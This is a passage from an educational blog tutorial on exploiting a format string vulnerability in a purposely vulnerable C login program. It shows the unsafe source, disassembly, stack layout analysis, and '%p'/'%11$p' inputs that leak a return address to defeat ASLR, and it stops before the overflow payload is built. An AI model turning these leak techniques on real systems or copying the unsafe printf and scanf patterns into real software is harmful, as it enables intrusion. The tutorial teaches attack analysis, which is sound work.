</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>checkPassword</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> password, <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>isAuthenticated) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(password, <span style=color:#e6db74>&#34;admin123&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>		<span style=color:#f92672>*</span>isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>AuthenticateUser</span>() {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> password[<span style=color:#ae81ff>8</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> username[<span style=color:#ae81ff>8</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span>  isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Enter Username: &#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, username);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Enter password for: &#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(username);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, password);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>checkPassword</span>(password, <span style=color:#f92672>&amp;</span>isAuthenticated);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (isAuthenticated <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>grantAccess</span>();
</span></span><span style=display:flex><span>	} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Authentication Failed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>AuthenticateUser</span>();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This is a version of the program we previously used in buffer overflows, but this time we will do it without disabling ASLR and without inspecting with GDB.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(username);
</span></span></code></pre></div><p>This is the line which allows us to exploit format string vulnerability. A safe version would&rsquo;ve been</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, username);
</span></span></code></pre></div><p>We still need to disable stackguard as our attack is based on buffer overflow</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc -fno-stack-protector  -O0 -o vuln  main.c
</span></span><span style=display:flex><span>main.c: In <span style=color:#66d9ef>function</span> ‘AuthenticateUser’:
</span></span><span style=display:flex><span>main.c:26:17: warning: format not a string literal and no format arguments <span style=color:#f92672>[</span>-Wformat-security<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>26</span> |          printf<span style=color:#f92672>(</span>username<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>      |                 ^~~~~~~~
</span></span></code></pre></div><p>We can see gcc shows us warning that we are passing only format string an not arguments. Static analysis can catch format strings vulnerability very effectively.</p><p>Let&rsquo;s look at the assembly of <code>AuthenticateUser</code> function to confirm the vulenrability</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ objdump -d -M intel,mnemonic,no-att -j .text vuln
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>00000000000011fe &lt;AuthenticateUser&gt;:
</span></span><span style=display:flex><span>    11fe:	f3 0f 1e fa          	endbr64
</span></span><span style=display:flex><span>    1202:	<span style=color:#ae81ff>55</span>                   	push   rbp
</span></span><span style=display:flex><span>    1203:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e5             	mov    rbp,rsp
</span></span><span style=display:flex><span>    1206:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>83</span> ec <span style=color:#ae81ff>20</span>          	sub    rsp,0x20
</span></span><span style=display:flex><span>    120a:	c7 <span style=color:#ae81ff>45</span> ec <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	mov    DWORD PTR <span style=color:#f92672>[</span>rbp-0x14<span style=color:#f92672>]</span>,0x0
</span></span><span style=display:flex><span>    1211:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>04</span> 0e <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xe04<span style=color:#f92672>]</span>        <span style=color:#75715e># 201c &lt;_IO_stdin_used+0x1c&gt;</span>
</span></span><span style=display:flex><span>    1218:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    121b:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    1220:	e8 6b fe ff ff       	call   <span style=color:#ae81ff>1090</span> &lt;printf@plt&gt;
</span></span><span style=display:flex><span>    1225:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>45</span> f0          	lea    rax,<span style=color:#f92672>[</span>rbp-0x10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1229:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c6             	mov    rsi,rax
</span></span><span style=display:flex><span>    122c:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> fa 0d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xdfa<span style=color:#f92672>]</span>        <span style=color:#75715e># 202d &lt;_IO_stdin_used+0x2d&gt;</span>
</span></span><span style=display:flex><span>    1233:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    1236:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    123b:	e8 <span style=color:#ae81ff>70</span> fe ff ff       	call   10b0 &lt;__isoc99_scanf@plt&gt;
</span></span><span style=display:flex><span>    1240:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> e9 0d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xde9<span style=color:#f92672>]</span>        <span style=color:#75715e># 2030 &lt;_IO_stdin_used+0x30&gt;</span>
</span></span><span style=display:flex><span>    1247:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    124a:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    124f:	e8 3c fe ff ff       	call   <span style=color:#ae81ff>1090</span> &lt;printf@plt&gt;
</span></span><span style=display:flex><span>    1254:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>45</span> f0          	lea    rax,<span style=color:#f92672>[</span>rbp-0x10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1258:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    125b:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    1260:	e8 2b fe ff ff       	call   <span style=color:#ae81ff>1090</span> &lt;printf@plt&gt;
</span></span><span style=display:flex><span>    1265:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>45</span> f8          	lea    rax,<span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1269:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c6             	mov    rsi,rax
</span></span><span style=display:flex><span>    126c:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> ba 0d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xdba<span style=color:#f92672>]</span>        <span style=color:#75715e># 202d &lt;_IO_stdin_used+0x2d&gt;</span>
</span></span><span style=display:flex><span>    1273:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    1276:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    127b:	e8 <span style=color:#ae81ff>30</span> fe ff ff       	call   10b0 &lt;__isoc99_scanf@plt&gt;
</span></span><span style=display:flex><span>    1280:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>55</span> ec          	lea    rdx,<span style=color:#f92672>[</span>rbp-0x14<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1284:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>45</span> f8          	lea    rax,<span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1288:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> d6             	mov    rsi,rdx
</span></span><span style=display:flex><span>    128b:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    128e:	e8 <span style=color:#ae81ff>30</span> ff ff ff       	call   11c3 &lt;checkPassword&gt;
</span></span><span style=display:flex><span>    1293:	8b <span style=color:#ae81ff>45</span> ec             	mov    eax,DWORD PTR <span style=color:#f92672>[</span>rbp-0x14<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1296:	<span style=color:#ae81ff>83</span> f8 <span style=color:#ae81ff>01</span>             	cmp    eax,0x1
</span></span><span style=display:flex><span>    1299:	<span style=color:#ae81ff>75</span> 0c                	jne    12a7 &lt;AuthenticateUser+0xa9&gt;
</span></span><span style=display:flex><span>    129b:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    12a0:	e8 <span style=color:#ae81ff>04</span> ff ff ff       	call   11a9 &lt;grantAccess&gt;
</span></span><span style=display:flex><span>    12a5:	eb 0f                	jmp    12b6 &lt;AuthenticateUser+0xb8&gt;
</span></span><span style=display:flex><span>    12a7:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>97</span> 0d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xd97<span style=color:#f92672>]</span>        <span style=color:#75715e># 2045 &lt;_IO_stdin_used+0x45&gt;</span>
</span></span><span style=display:flex><span>    12ae:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    12b1:	e8 ca fd ff ff       	call   <span style=color:#ae81ff>1080</span> &lt;puts@plt&gt;
</span></span><span style=display:flex><span>    12b6:	<span style=color:#ae81ff>90</span>                   	nop
</span></span><span style=display:flex><span>    12b7:	c9                   	leave
</span></span><span style=display:flex><span>    12b8:	c3                   	ret
</span></span></code></pre></div><p>We know the calling convention is to place first parameter in <code>rdi</code> and second parameter in <code>rsi</code>.</p><p>We can see in the first two <code>printf</code> calls, the value in <code>rdi</code> is taken from <code>.rodata</code> section. It uses RIP relative addressing here to point to the address of the hardcoded format strings.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>    122c:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> fa 0d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xdfa<span style=color:#f92672>]</span>        <span style=color:#75715e># 202d &lt;_IO_stdin_used+0x2d&gt;</span>
</span></span><span style=display:flex><span>    1233:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    1236:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    123b:	e8 <span style=color:#ae81ff>70</span> fe ff ff       	call   10b0 &lt;__isoc99_scanf@plt&gt;
</span></span><span style=display:flex><span>    1240:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> e9 0d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xde9<span style=color:#f92672>]</span>        <span style=color:#75715e># 2030 &lt;_IO_stdin_used+0x30&gt;</span>
</span></span><span style=display:flex><span>    1247:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    124a:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    124f:	e8 3c fe ff ff       	call   <span style=color:#ae81ff>1090</span> &lt;printf@plt&gt;
</span></span></code></pre></div><p>But in the third <code>printf</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>    1254:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>45</span> a0          	lea    rax,<span style=color:#f92672>[</span>rbp-0x10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1258:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    125b:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    1260:	e8 2b fe ff ff       	call   <span style=color:#ae81ff>1090</span> &lt;printf@plt&gt;
</span></span></code></pre></div><p>We can see the adress written to <code>rdi</code> is relative to <code>rbp</code> which means its clearly on the stack and its the address of the <code>username</code> variable.</p><h3 id=exploit-1-leak-the-stack-adresses-and-relace-the-return-address-of-authenticateuser-to-grantaccess>Exploit 1: Leak the Stack Adresses and Relace the Return Address of <code>AuthenticateUser</code> to <code>grantAccess</code><a hidden class=anchor aria-hidden=true href=#exploit-1-leak-the-stack-adresses-and-relace-the-return-address-of-authenticateuser-to-grantaccess>#</a></h3><p>Let&rsquo;s visualize the stack layout:</p><pre tabindex=0><code>1206:	sub    rsp,0x20           # Allocate 32 bytes (0x20)
120a:	mov    DWORD PTR [rbp-0x14],0x0    # isAuthenticated
1225:	lea    rax,[rbp-0x10]              # username
1265:	lea    rax,[rbp-0x8]               # password
</code></pre><p><strong>Stack layout:</strong></p><pre tabindex=0><code>Higher addresses
┌──────────────────────┐
│ Return address       │ ← [rbp+8]  (0x12cb - points to main)
│ (0x55...12cb)        │    **WE WANT TO OVERWRITE THIS!**
├──────────────────────┤
│ Saved RBP            │ ← [rbp]    (8 bytes)
├──────────────────────┤
│ password[8]          │ ← [rbp-0x8]  (8 bytes from RBP)
├──────────────────────┤
│ username[8]          │ ← [rbp-0x10] (16 bytes from RBP)
├──────────────────────┤
│ isAuthenticated (4)  │ ← [rbp-0x14] (20 bytes from RBP)
├──────────────────────┤
│ padding (12 bytes)   │ ← [rbp-0x20] (unused, stack aligned)
└──────────────────────┘
Lower addresses
</code></pre><p>Total stack frame: 32 bytes (0x20)</p><h4 id=calculating-key-distances>Calculating Key Distances<a hidden class=anchor aria-hidden=true href=#calculating-key-distances>#</a></h4><h5 id=1-distance-of-password-from-saved-ra>1. Distance of Password From Saved RA<a hidden class=anchor aria-hidden=true href=#1-distance-of-password-from-saved-ra>#</a></h5><p>This is what we need to leak with format string vulnerability and overwrite it later</p><ul><li>username at <code>[rbp-0x10]</code></li><li>password at <code>[rbp-0x8]</code></li><li>return address at <code>[rbp+8]</code></li><li>Distance from username to return address: <code>0x10 + 8 = 24 bytes</code></li><li>Distance from password to return address: <code>0x8 + 8 = 16 bytes</code></li></ul><h5 id=2-the-actual-address-of-grantaccess>2. The Actual Address of <code>grantAccess</code><a hidden class=anchor aria-hidden=true href=#2-the-actual-address-of-grantaccess>#</a></h5><p>This is where we need to jump to using buffer overflow and the previous information leaked.</p><p>Now lets calculate the address of <code>grantAccess</code>: Since this is PIE + ASLR enabled binary and we are not using GDB, we need a creative way to find dynamic address of <code>grantAccess</code> function. One insight that we can recall is, even with PIE and ASLR enabled, the relative distance between the lines of code in <code>.text</code> section remains same.</p><pre tabindex=0><code>00000000000012b9 &lt;main&gt;:
    12b9:	f3 0f 1e fa          	endbr64
    12bd:	55                   	push   rbp
    12be:	48 89 e5             	mov    rbp,rsp
    12c1:	b8 00 00 00 00       	mov    eax,0x0
    12c6:	e8 33 ff ff ff       	call   11fe &lt;AuthenticateUser&gt;
    12cb:	b8 00 00 00 00       	mov    eax,0x0 -&gt; this is the return address of AuthenticateUser
    12d0:	5d                   	pop    rbp 
    12d1:	c3                   	ret
</code></pre><pre tabindex=0><code>Return address (leaked): 0x12cb
grantAccess:            0x11a9
Offset:                 0x12cb - 0x11a9 = 0x122 (290 bytes)
</code></pre><p>Since we would&rsquo;ve already leaked the return address in <code>main</code> using format string in our previous step,
we can add this offset of 290 bytes to get the actual address of <code>grantAccess</code>.</p><h5 id=3-correct-argument-to-leak-from-printf>3. Correct Argument to Leak From <code>printf</code><a hidden class=anchor aria-hidden=true href=#3-correct-argument-to-leak-from-printf>#</a></h5><p>When we call printf:</p><pre tabindex=0><code>call printf
</code></pre><p>Inside printf&rsquo;s perspective:</p><pre tabindex=0><code>Position 1-6: RDI, RSI, RDX, RCX, R8, R9 (registers)
Position 7:   [rsp]      ← First stack parameter
Position 8:   [rsp+8]    ← Second stack parameter
Position 9:   [rsp+16]   ← Third stack parameter
Position 10:  [rsp+24]
etc.
</code></pre><p>What the Compiler Generates:</p><pre tabindex=0><code># Caller (before call printf):
push arg8          # Push in reverse order
push arg7
mov r9, arg6       # Load registers
mov r8, arg5
mov rcx, arg4
mov rdx, arg3
mov rsi, arg2
mov rdi, arg1
call printf        # Now RSP points right at arg7!

# After printf returns:
add rsp, 16        # Clean up the 2 stack args (arg7, arg8)
</code></pre><p>Since callee is passing the variadic arguments, it will be located on the stack before the <code>printf</code>&rsquo;s stack frame is set up.</p><p>This is the stack frame just before <code>printf</code> is about to be called, the callee has pushed the variadic arguments ot stack (in this case its not) and saved the return adddress to callee. The printf&rsquo;s prologue has not been executed yet. Since the variadic argument <code>va_list</code> is already present on stack, we can guarantee that <code>printf</code>&rsquo;s <code>arg_ptr</code> starts scanning arguments from there and the actual stack frame of <code>printf</code> doesn&rsquo;t even matter.</p><pre tabindex=0><code>Higher addresses
┌──────────────────────┐
│ Return to main       │  ← AuthenticateUser return addr (TARGET)
├──────────────────────┤
│ Saved RBP            │
├──────────────────────┤
│ password[8]          │
├──────────────────────┤
│ username[8]          │
├──────────────────────┤
│ isAuthenticated +    │
│ padding              │
├──────────────────────┤
│ va_list              │  ← printf&#39;s arg_ptr starts, here, it will look like [rbp+8] in printf&#39;s assembly
├──────────────────────┤
│ return address to.   |
| AuthenticateUser.    │  ← [rsp] of AuthenticateUser 
└──────────────────────┘
Lower addresses
</code></pre><p>By looking at the <a href=#exploit-1-leak-the-stack-adresses-and-relace-the-return-address-of-authenticateuser-to-grantaccess>stack</a> we built previously. We can see we ened to move the <code>printf</code>&rsquo;s <code>arg_ptr</code> 5 times. So considering 6 register arguments, we get 6 + 5 = 11. So we need to leak the 12th value in what printf thinks is a value to format string.</p><p>We can use <code>%p</code> to print the addresses with <code>0x</code> prefix. If we add <code>%p</code> 11 times, we will leak the 11th argument.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sanketh@sanketh-81de:$ ./vuln
</span></span><span style=display:flex><span>Enter Username: %p%p%p%p%p%p%p%p%p%p%p
</span></span><span style=display:flex><span>Enter password <span style=color:#66d9ef>for</span>: 0x7ffded20f2c0<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0xa0xffffffff<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0x70257025702570250x70257025702570250x7025702570250x5d61a35072cb^C
</span></span><span style=display:flex><span>sanketh@sanketh-81de:$ ./vuln
</span></span><span style=display:flex><span>Enter Username: %p%p%p%p%p%p%p%p%p%p%p
</span></span><span style=display:flex><span>Enter password <span style=color:#66d9ef>for</span>: 0x7ffeb89c1e40<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0xa0xffffffff<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0x70257025702570250x70257025702570250x7025702570250x5ce761ba72cb^C
</span></span><span style=display:flex><span>sanketh@sanketh-81de:$ ./vuln
</span></span><span style=display:flex><span>Enter Username: %p%p%p%p%p%p%p%p%p%p%p
</span></span><span style=display:flex><span>Enter password <span style=color:#66d9ef>for</span>: 0x7ffe874444d0<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0xa0xffffffff<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0x70257025702570250x70257025702570250x7025702570250x5ca4fddfe2cb^C
</span></span><span style=display:flex><span>sanketh@sanketh-81de:$ ./vuln
</span></span><span style=display:flex><span>Enter Username: %p%p%p%p%p%p%p%p%p%p%p
</span></span><span style=display:flex><span>Enter password <span style=color:#66d9ef>for</span>: 0x7ffd4ef49d80<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0xa0xffffffff<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0x70257025702570250x70257025702570250x7025702570250x651533b3e2cb^C
</span></span></code></pre></div><p>We can see even with ASLR, our return address consistenly ends with <code>2cb</code>. In fact even the static address on binary showed the address ending with <code>2cb</code>.</p><pre tabindex=0><code>    12cb:	b8 00 00 00 00       	mov    eax,0x0 -&gt; this is the return address of AuthenticateUser
</code></pre><p>The important observation here is, the last 3 nibbles remains unchanged even after ASLR!</p><p>Its because of the page alignment
• Page size = <code>4096 bytes</code> = <code>0x1000</code>
• That means the lowest 12 bits are always zero</p><p>So the constant offset ASLR will be adding has to be a multiple of <code>4096</code> which means last 3 nibbles are always 0. Otherwise it would disturb the page layout of segments.</p><p>We can use this as to double confirm we&rsquo;re headed in the right direction. Or we can also do rough calculation and leak a set of addresses around our estimate and look for the one ending with expected last 12 bits.</p><p>Sometimes we may not have space to tpe enough <code>%p</code>&rsquo;s, the content itself might overflow and end up overwriting the return address which will simply crash the program. There is another we can print any argument with just 8 bytes of input</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Enter Username: %11$p
</span></span><span style=display:flex><span>Enter password <span style=color:#66d9ef>for</span>: 0x5a45b5b602cb
</span></span></code></pre></div><p>This will directly take us to the 11th parameter.</p><h3 id=building-the-payload-for-buffer-overflow>Building the Payload for Buffer Overflow<a hidden class=anchor aria-hidden=true href=#building-the-payload-for-buffer-overflow>#</a></h3></div><footer class=post-footer><ul class=post-tags><li><a href=https://sankethbk.github.io/blog/tags/vulnerabilities/>Vulnerabilities</a></li><li><a href=https://sankethbk.github.io/blog/tags/format-string/>Format String</a></li><li><a href=https://sankethbk.github.io/blog/tags/buffer-overflow/>Buffer Overflow</a></li><li><a href=https://sankethbk.github.io/blog/tags/reverse-engineering/>Reverse Engineering</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://sankethbk.github.io/blog/>Sanketh's Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>